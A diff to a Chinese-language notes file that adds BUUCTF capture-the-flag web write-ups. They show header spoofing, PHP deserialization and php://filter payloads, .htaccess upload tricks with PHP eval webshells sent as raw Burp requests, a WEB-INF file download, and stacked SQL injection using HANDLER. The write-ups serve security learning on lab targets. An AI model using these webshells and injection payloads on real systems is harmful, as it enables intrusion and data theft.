@@ -374,9 +374,146 @@ echo "Can you find out the flag?";
 //flag{878f9d81-e644-4698-b38f-b0be4ef9979c}
 ```
 
+------
+
+### BUU BURP COURSE 1
+
+#### 解法一：HackBar
+
+打开靶机后只有一行文字。
+
+```
+只能本地访问。
+```
+
+用`HackBar`添加`X-Forward-For: 127.0.0.1`后还是不行，添加`X-Real-IP: 127.0.0.1`后看到一个记住密码的登录界面，账号密码默认填写，查看源码后拿到`username`和`password`，填入`Body`中，`POST`请求后显示登录成功，拿到`flag`。
+
+------
+
+#### 解法二：Python
+
+编写`python`代码求解。
+
+```python
+import requests
+
+url = 'http://node5.buuoj.cn:28701/'
+headers={'X-Forwarded-For':'127.0.0.1', 'X-Real-IP':'127.0.0.1'}
+r = requests.get(url, headers=headers)
+print(r.text)
+
+data = {
+    'username':'admin', 
+    'password':'wwoj2wio2jw93ey43eiuwdjnewkndjlwe'
+}
+r = requests.post(url, headers=headers, data=data)
+print(r.text)
+'''
+登录成功！flag{d0a6aefb-d565-4871-944a-ed1f63096948}
+'''
+```
+
+运行代码得到以下内容：
+
+```html
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="UTF-8">
+    <title>登录</title>
+</head>
+<body>
+<div style="text-align: center">
+    <form action="" method="post">
+        用户名：<input type="text" name="username" value="admin"/><br>
+        密码：<input type="password" name="password" value="wwoj2wio2jw93ey43eiuwdjnewkndjlwe"/><br>
+        <input type="submit" value="登录"/>
+    </form>
+</div>
+</body>
+</html>
+```
+
+继续编写`python`代码，将账号密码填入`data`中发送`POST`请求。
+
+```python
+import requests
+
+url = 'http://node5.buuoj.cn:28701/'
+headers={'X-Forwarded-For':'127.0.0.1', 'X-Real-IP':'127.0.0.1'}
+# r = requests.get(url, headers=headers)
+# print(r.text)
+
+data = {
+    'username':'admin', 
+    'password':'wwoj2wio2jw93ey43eiuwdjnewkndjlwe'
+}
+r = requests.post(url, headers=headers, data=data)
+print(r.text)
+'''
+登录成功！flag{d0a6aefb-d565-4871-944a-ed1f63096948}
+'''
+```
+
+提交`flag`即可。
+
+#### 解法三：BurpSuite
+
+`Burp Suite`抓包，添加`X-Real-IP: 127.0.0.1`后发送`GET`请求。
+
+```
+GET / HTTP/1.1
+Host: node5.buuoj.cn:28701
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+X-Real-IP: 127.0.0.1
+Connection: keep-alive
+```
+
+`Forward`后看到默认填写账号密码的页面，继续抓包，添加`X-Real-IP: 127.0.0.1`后放行`POST`请求。
+
+```
+POST / HTTP/1.1
+Host: node5.buuoj.cn:28702
+Content-Length: 57
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Origin: http://node5.buuoj.cn:28702
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://node5.buuoj.cn:28702/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+X-Real-IP: 127.0.0.1
+Connection: keep-alive
+
+username=admin&password=wwoj2wio2jw93ey43eiuwdjnewkndjlwe
+```
+
+成功拿到`flag`。
+
+```
+HTTP/1.1 200 OK
+Server: nginx/1.14.2
+Date: Wed, 10 Dec 2025 04:07:19 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+X-Powered-By: PHP/7.3.5
+Content-Length: 58
+
+登录成功！flag{d0a6aefb-d565-4871-944a-ed1f63096948}
+```
+
+------
+
 ### [[极客大挑战 2019]Http](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Http)
 
-##### 解法1：BurpSuite
+#### 解法1：BurpSuite
 
 直接`view-source:http://node4.buuoj.cn:25280/`查看源码，可以找到这样一段代码：
 
@@ -399,7 +536,7 @@ echo "Can you find out the flag?";
 
 用`BurpSuite`添加`X-Forwarded-For:127.0.0.1`后可以拿到`flag`。
 
-##### 解法2：Golang
+#### 解法2：Golang
 
 ```go
 package main
@@ -436,12 +573,13 @@ func main() {
 }
 ```
 
-##### 解法3：Python
+#### 解法3：Python
 
 ```python
 import requests
+
 url = 'http://node4.buuoj.cn:25280/Secret.php'
-headers={"Referer":"https://www.Sycsecret.com","Origin":"https://www.Sycsecret.com"}
+headers={'Referer':'https://www.Sycsecret.com'}
 headers['User-Agent'] = "Syclover"
 headers['X-Forwarded-For'] = '127.0.0.1'
 r = requests.get(url,headers=headers)
@@ -512,6 +650,25 @@ flag{2f1ec631-f839-4d42-8413-b790506989a7}
 <div style="position: absolute;bottom: 0;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div>
 </body>
 </html>
+```
+
+#### python直接出flag
+
+```python
+import requests
+from bs4 import BeautifulSoup
+
+url = 'http://node5.buuoj.cn:26591/Secret.php'
+headers = {
+    'Referer': 'https://Sycsecret.buuoj.cn',
+    'User-Agent': 'Syclover',
+    'X-Forwarded-For': 'localhost'
+}
+r = requests.get(url, headers=headers)
+# print(r.text)
+soup = BeautifulSoup(r.text, 'html.parser')
+flag = soup.h1.text.strip()
+print(flag)  # flag{41738a8c-6e6c-44cd-a877-6f08ad8ba59d} 
 ```
 
 ------
@@ -674,6 +831,148 @@ echo $chen."<br />";
 访问`http://453330ed-2554-4984-8840-0b67be1cca69.node4.buuoj.cn:81/?pleaseget=1`并用`Hackbar`来提交`POST`数据`pleasepost=2&md51=s878926199a&md52=s155964671a&obj=O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}`，从而得到`flag{da006ff2-25a4-42d3-9735-ce27b5ad4dfc}`。
 
 ![](https://paper.tanyaodan.com/BUUCTF/buu_code_review/1.png)
+
+------
+
+### [ZJCTF 2019]NiZhuanSiWei
+
+进入靶机后直接就是代码审计：
+
+```php
+<?php  
+$text = $_GET["text"];
+$file = $_GET["file"];
+$password = $_GET["password"];
+if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
+    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
+    if(preg_match("/flag/",$file)){
+        echo "Not now!";
+        exit(); 
+    }else{
+        include($file);  //useless.php
+        $password = unserialize($password);
+        echo $password;
+    }
+}
+else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+需要用`GET`请求传递三个参数，`text`，`file`和`password`。
+
+首先，我们由`if`判断条件`file_get_contents($text,'r')==="welcome to the zjctf"`可知第一个参数`text=data://text/plain,welcome to the zjctf`。传递该值后看到 welcome to the zjctf。
+
+如果存在过滤的话可以绕过，`text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=`。
+
+接着看第二个判断条件`preg_match("/flag/",$file)`。我们无法直接读取`flag`，它的注释中还提示了`userless.php`。针对`php`文件，我们无法直接使用`file=useless.php`查看源码内容，需要`base64`编码再解码后才能读取源码内容。
+
+通常，`php://filter/read`用于读取源码，`php://input`用于执行`php`代码。所以我们可以用`file=php://filter/read=convert.base64-encode/resource=useless.php`来获取加密后的源码。
+
+```
+PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=
+```
+
+直接在`cmd`命令行用`php -r "var_dump(base64_decode(''))";`进行`base64`解码，得到源码信息。
+
+```php
+C:\Users\tyd>php -r "var_dump(base64_decode('PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo='));"
+string(278) "<?php
+
+class Flag{  //flag.php
+    public $file;
+    public function __tostring(){
+        if(isset($this->file)){
+            echo file_get_contents($this->file);
+            echo "<br>";
+        return ("U R SO CLOSE !///COME ON PLZ");
+        }
+    }
+}
+?>
+"
+```
+
+第三个参数`password`涉及到的关键代码部分如下，很明显考察`PHP`反序列化的知识。
+
+```php
+$password = $_GET["password"];
+include($file);  //useless.php源码如下
+class Flag{      //flag.php
+    public $file;
+    public function __tostring(){
+        if(isset($this->file)){
+            echo file_get_contents($this->file);
+            echo "<br>";
+        return ("U R SO CLOSE !///COME ON PLZ");
+        }
+    }
+}
+$password = unserialize($password);
+echo $password;
+```
+
+对`password`进行反序列化，得到`O:4:"Flag":1:{s:4:"file";s:10:"./flag.php";}`。
+
+```php
+<?php 
+class Flag{  //flag.php  
+ public $file;  
+ public function __tostring(){  
+ if(isset($this->file)){  
+            echo file_get_contents($this->file); 
+            echo "<br>";
+ return ("U R SO CLOSE !///COME ON PLZ");
+        }  
+    }  
+}
+$a=new Flag();
+$a->file=('./flag.php');
+echo serialize($a);
+?>
+// O:4:"Flag":1:{s:4:"file";s:10:"./flag.php";}
+```
+
+构造以下参数，访问后查看源码得到`flag`。
+
+```
+/?text=data://text/plain,welcome%20to%20the%20zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:10:"./flag.php";}
+```
+
+或者可以用以下代码得到`O:4:"Flag":1:{s:4:"file";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}`，这也可以是第三个参数`password`的值。
+
+```php
+<?php
+
+class Flag{  //flag.php  
+    public $file="php://filter/read=convert.base64-encode/resource=flag.php";    
+}
+$a = new Flag();
+$b = serialize($a);
+echo $b;
+?>
+// ?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:Flag":1:{s:4:"file";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}
+```
+
+访问页面看到信息：
+
+> ### welcome to the zjctf
+>
+> oh u find it
+>
+> U R SO CLOSE !///COME ON PLZ
+
+查看源码发现存在注释和一个`if`条件永不为真的`php`代码块。
+
+```php+HTML
+<!--but i cant give it to u now-->
+<?php
+if(2===3){  
+	return ("flag{2123b1d0-cfd2-4466-81ce-74b99858cbd5}");
+}
+?>
+```
 
 ------
 
@@ -1510,9 +1809,7 @@ Upload Success! Look here~ ./uplo4d/ff66b3e97751db68e9248c93806c7119.phtml
 既然可以上传`.htaccess`文件，那就能让后端将所有`.jpg`文件都当作`PHP`文件进行处理。
 
 ```htaccess
-<IfModule mime_module>
 AddType application/x-httpd-php .jpg
-</IfModule>
 ```
 
 将上述内容写入`.htaccess`文件进行上传。
@@ -1537,9 +1834,7 @@ Connection: keep-alive
 Content-Disposition: form-data; name="uploaded"; filename=".htaccess"
 Content-Type: image/jpeg
 
-<IfModule mime_module>
 AddType application/x-httpd-php .jpg
-</IfModule>
 ------WebKitFormBoundaryurys2vleWNueTN13
 Content-Disposition: form-data; name="submit"
 
@@ -1556,7 +1851,7 @@ Content-Disposition: form-data; name="submit"
 随后，我们上传一个写入`PHP Webshell`的`jpg`文件，当用户访问该`jpg`文件时，就能自动生成`shell.php`文件。先将以下代码写入`a.php`文件中。
 
 ```php
-<?php fputs(fopen("./shell.php", "w"), '<?php @eval($_POST[shell]) ?>'); ?>
+<?php fputs(fopen("./shell.php", "w"), "<?php @eval($_POST['shell']) ?>"); ?>
 ```
 
 用`Burp Suite`将其文件类型修改为`image/jpeg`，文件名也修改为`a.jpg`。
@@ -1581,7 +1876,7 @@ Connection: keep-alive
 Content-Disposition: form-data; name="uploaded"; filename="a.jpg"
 Content-Type: image/jpeg
 
-<?php fputs(fopen("./shell.php", "w"), '<?php @eval($_POST[shell]) ?>'); ?>
+<?php fputs(fopen("./shell.php", "w"), '<?php @eval($_POST['shell']) ?>'); ?>
 ------WebKitFormBoundarywqoMrtSyNb3BHY9T
 Content-Disposition: form-data; name="submit"
 
@@ -1597,6 +1892,132 @@ Content-Disposition: form-data; name="submit"
 先用浏览器访问该文件`a.jpg`，靶机会如我们所愿生成`shell.php`文件，用`AntSword`连接靶机，可以看到`shell.php`文件内容为PHP一句话木马，且在靶机根目录存在`flag`文件。
 
 ![](https://paper.tanyaodan.com/BUUCTF/mrctf2020_upload.jpg)
+
+------
+
+### [GXYCTF2019]BabyUpload
+
+上传`.htaccess`文件，让后端将所有`.jpg`文件都当作`PHP`文件进行处理。
+
+```htaccess
+AddType application/x-httpd-php .jpg
+```
+
+将上述内容写入`.htaccess`文件进行上传。
+
+```
+POST / HTTP/1.1
+Host: caf37f3c-89c3-4390-892a-2c41f59627d0.node5.buuoj.cn:81
+Content-Length: 336
+Cache-Control: max-age=0
+Origin: http://caf37f3c-89c3-4390-892a-2c41f59627d0.node5.buuoj.cn:81
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoqf5jeYTTG3qqsUY
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://caf37f3c-89c3-4390-892a-2c41f59627d0.node5.buuoj.cn:81/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=eaebdd1ab20fb7bb023a666dd1d0b639
+Connection: keep-alive
+
+------WebKitFormBoundaryoqf5jeYTTG3qqsUY
+Content-Disposition: form-data; name="uploaded"; filename=".htaccess"
+Content-Type: image/jpeg
+
+AddType application/x-httpd-php .jpg
+------WebKitFormBoundaryoqf5jeYTTG3qqsUY
+Content-Disposition: form-data; name="submit"
+
+上传
+------WebKitFormBoundaryoqf5jeYTTG3qqsUY--
+```
+
+文件上传成功后，网页显示信息如下：
+
+> /var/www/html/upload/0c80df51c2288c1304a7b1190c0aa12d/.htaccess succesfully uploaded!
+
+我们继续用上一道题的方法，上传一个写入`PHP Webshell`的`jpg`文件，当用户访问该`jpg`文件时，就能自动生成`shell.php`文件。先将以下代码写入`a.php`文件中。
+
+```php
+<?php fputs(fopen("./shell.php", "w"), '<?php @eval($_POST[shell]) ?>'); ?>
+```
+
+用`Burp Suite`将其文件类型修改为`image/jpeg`，文件名也修改为`1.jpg`。
+
+```
+POST / HTTP/1.1
+Host: caf37f3c-89c3-4390-892a-2c41f59627d0.node5.buuoj.cn:81
+Content-Length: 373
+Cache-Control: max-age=0
+Origin: http://698aa538-23bd-474a-b657-566d29a40953.node5.buuoj.cn:81
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx5oRtk3mKa6F7XGc
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://698aa538-23bd-474a-b657-566d29a40953.node5.buuoj.cn:81/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=3f660413cccbf827d02d3864b3a32bfc
+Connection: keep-alive
+
+------WebKitFormBoundaryx5oRtk3mKa6F7XGc
+Content-Disposition: form-data; name="uploaded"; filename="1.jpg"
+Content-Type: image/jpeg
+
+<?php fputs(fopen("./shell.php", "w"), "<?php @eval($_POST['shell']) ?>"); ?>
+------WebKitFormBoundaryx5oRtk3mKa6F7XGc
+Content-Disposition: form-data; name="submit"
+
+上传
+------WebKitFormBoundaryx5oRtk3mKa6F7XGc--
+```
+
+结果上传失败，网页显示信息：
+
+> 诶，别蒙我啊，这标志明显还是php啊
+
+那直接上传`.jpg`后缀的一句话木马文件。
+
+```js
+<script language="php">@eval($_POST['shell'])</script>
+```
+
+用`Burp Suite`将其文件类型修改为`image/jpeg`，文件名也修改为`1.jpg`。
+
+```
+POST / HTTP/1.1
+Host: caf37f3c-89c3-4390-892a-2c41f59627d0.node5.buuoj.cn:81
+Content-Length: 350
+Cache-Control: max-age=0
+Origin: http://caf37f3c-89c3-4390-892a-2c41f59627d0.node5.buuoj.cn:81
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZO1P0zAAsKMQLxcC
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://caf37f3c-89c3-4390-892a-2c41f59627d0.node5.buuoj.cn:81/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=eaebdd1ab20fb7bb023a666dd1d0b639
+Connection: keep-alive
+
+------WebKitFormBoundaryZO1P0zAAsKMQLxcC
+Content-Disposition: form-data; name="uploaded"; filename="1.jpg"
+Content-Type: image/jpeg
+
+<script language="php">@eval($_POST['shell'])</script>
+------WebKitFormBoundaryZO1P0zAAsKMQLxcC
+Content-Disposition: form-data; name="submit"
+
+上传
+------WebKitFormBoundaryZO1P0zAAsKMQLxcC--
+```
+
+文件上传成功后，网页显示信息如下：
+
+> /var/www/html/upload/0c80df51c2288c1304a7b1190c0aa12d/1.jpg succesfully uploaded!
+
+用`AntSword`连接后，在`/flag`文件中成功拿到`flag{328870e7-46c1-445d-80cf-ba5b3f3d96e2}`。
 
 ------
 
@@ -2253,6 +2674,206 @@ bin boot dev etc ffffllllaaaaggggg home lib lib64 media mnt opt proc root run sb
 
 flag{3268a104-6cc6-4efe-b09e-600ce18dc594}
 ```
+
+------
+
+### [RoarCTF 2019]Easy Java
+
+进入靶机后看到一个登录框，用`Burp Suite`弱密码爆破，发现账户是`admin`，密码是`admin888`。登录进入后看到信息：
+
+> Flag is not here!
+>
+> 这是一道送分题
+
+白白浪费时间了，点击登录框下方的help，进入到`/Download?filename=help.docx`页面，内容为：
+
+> java.io.FileNotFoundException:{help.docx}
+
+用`HackBar`来构造`POST`请求`/Download?filename=help.docx`，成功下载文件`help.docx`，内容为：
+
+> Are you sure the flag is here? ? ?
+
+题目名字叫做Easy Java，到底Easy在哪儿？`WEB-INF`是`Java`的`WEB`应用的安全目录，如果想在页面中直接访问其中的文件，必须通过`/WEB-INF/web.xml`文件对要访问的文件进行相应映射才能访问。
+
+用`HackBar`来构造`POST`请求`/Download?filename=WEB-INF/web.xml`，下载文件`WEB-INF/web.xml`。我们可以在该文件中看到关键信息：
+
+```xml
+<servlet>
+	<servlet-name>FlagController</servlet-name>
+	<servlet-class>com.wm.ctf.FlagController</servlet-class>
+</servlet>
+<servlet-mapping>
+	<servlet-name>FlagController</servlet-name>
+	<url-pattern>/Flag</url-pattern>
+</servlet-mapping>
+```
+
+`WEB-INF/web.xml`：Web应用程序配置文件，描述了servlet和其他的应用组件配置及命名规则。
+
+`WEB-INF/database.properties`：数据库配置文件。
+
+`WEB-INF/classes/`：一般用来存放`Java`类文件（`class`）。
+
+`WEB-INF/lib/`：用来存放打包好的库（jar）。
+
+`WEB-INF/src/`：用来放源代码。
+
+所以，`com.wm.ctf.FlagController`的文件路径是`classes/com/wm/ctf/FlagController.class`，构造`POST`请求`/Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class`下载。
+
+用`jadx-gui`打开`FlagController.class`查看源码，发现关键变量`flag`。
+
+```java
+package defpackage;
+
+import java.io.IOException;
+import javax.servlet.ServletException;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+
+@WebServlet(name = "FlagController")
+/* loaded from: WEB-INF_classes_com_wm_ctf_FlagController.class */
+public class FlagController extends HttpServlet {
+    String flag = "ZmxhZ3s1OGViODNjMi1iYTYyLTQ2MGQtYThmNy1lMDc5NzFlOWY4ZWJ9Cg==";
+
+    protected void doGet(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException, IOException {
+        httpServletResponse.getWriter().print("<h1>Flag is nearby ~ Come on! ! !</h1>");
+    }
+}
+```
+
+用`Python`对该字符串进行`base64`解码得到最终的`flag`。
+
+```python
+>>> from base64 import b64decode
+>>> b64decode('ZmxhZ3s1OGViODNjMi1iYTYyLTQ2MGQtYThmNy1lMDc5NzFlOWY4ZWJ9Cg==')
+b'flag{58eb83c2-ba62-460d-a8f7-e07971e9f8eb}\n'
+```
+
+------
+
+### [GYCTF2020]Blacklist
+
+靶机关键信息如下：
+
+> ### Black list is so weak for you,isn't it
+>
+> array(2) {
+>   [0]=>
+>   string(1) "1"
+>   [1]=>
+>   string(7) "hahahah"
+> }
+
+输入`1'`和`1'--+`提交后可以看到同样的回显，说明这是字符型SQL注入，且闭合字符为`'`。
+
+输入`-1' union select 1,2,3--+`提交后看到：
+
+```sql
+return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
+```
+
+回显信息表明这些关键字被过滤了。
+
+用`sqlmap`爆破可以发现数据库名称是`supersqli`，但是继续爆破数据表的时候遇到了困难。
+
+尝试堆叠注入，输入`1'; show tables;`提交后看到：
+
+> array(2) {
+>   [0]=>
+>   string(1) "1"
+>   [1]=>
+>   string(7) "hahahah"
+> }
+>
+> ------
+>
+> array(1) {
+>   [0]=>
+>   string(8) "FlagHere"
+> }
+> array(1) {
+>   [0]=>
+>   string(5) "words"
+> }
+>
+> ------
+
+输入`1';show columns from FlagHere;`提交后看到：
+
+> array(2) {
+>   [0]=>
+>   string(1) "1"
+>   [1]=>
+>   string(7) "hahahah"
+> }
+>
+> ------
+>
+> array(6) {
+>   [0]=>
+>   string(4) "flag"
+>   [1]=>
+>   string(12) "varchar(100)"
+>   [2]=>
+>   string(2) "NO"
+>   [3]=>
+>   string(0) ""
+>   [4]=>
+>   NULL
+>   [5]=>
+>   string(0) ""
+> }
+>
+> ------
+
+`select`函数被过滤掉了，我们可以使用`handler`。`HANDLER`命令是`MySQL`中的一种特殊命令，它允许用户在底层与表的存储引擎直接交互。我们通过`HANDLER`可以打开一个表，然后逐行读取数据，而不需要使用`SELECT`语句。这种底层的访问方式在某些场景下可以提供更高的性能，尤其是在需要批量处理大量数据的情况下。`HANDLER`命令的使用语法如下：
+
+```sql
+HANDLER tbl_name OPEN [ [AS] alias]
+
+HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,…)
+[ WHERE where_condition ] [LIMIT … ]
+HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
+[ WHERE where_condition ] [LIMIT … ]
+HANDLER tbl_name READ { FIRST | NEXT }
+[ WHERE where_condition ] [LIMIT … ]
+HANDLER tbl_name CLOSE
+```
+
+翻译成人话举例就是：
+
+```sql
+HANDLER test open;        # 打开test表
+HANDLER test read first;  # 阅读test表中第一行内容
+handler test read next;   # 阅读test表下一行内容
+handler test close;       # 关闭
+```
+
+输入`1'; handler FlagHere open f; handler f read first;`提交后看到以下信息：
+
+> array(2) {
+>   [0]=>
+>   string(1) "1"
+>   [1]=>
+>   string(7) "hahahah"
+> }
+>
+> ------
+>
+> array(1) {
+>   [0]=>
+>   string(42) "flag{f76148f7-48fb-4ee5-81b1-3c24d1bfa3b3}"
+> }
+
+当然，完整的写法应该是：
+
+```
+1'; handler FlagHere open f; handler f read first; handler f close;
+```
+
+这道题能够堆叠注入的原因是因为靶机使用了`mysqli_multi_query($sql1,$sql2);`函数，所以攻击者可以利用分号对`sql`执行语句进行隔断，从而执行新一行的`sql`命令。
 
 ------
 
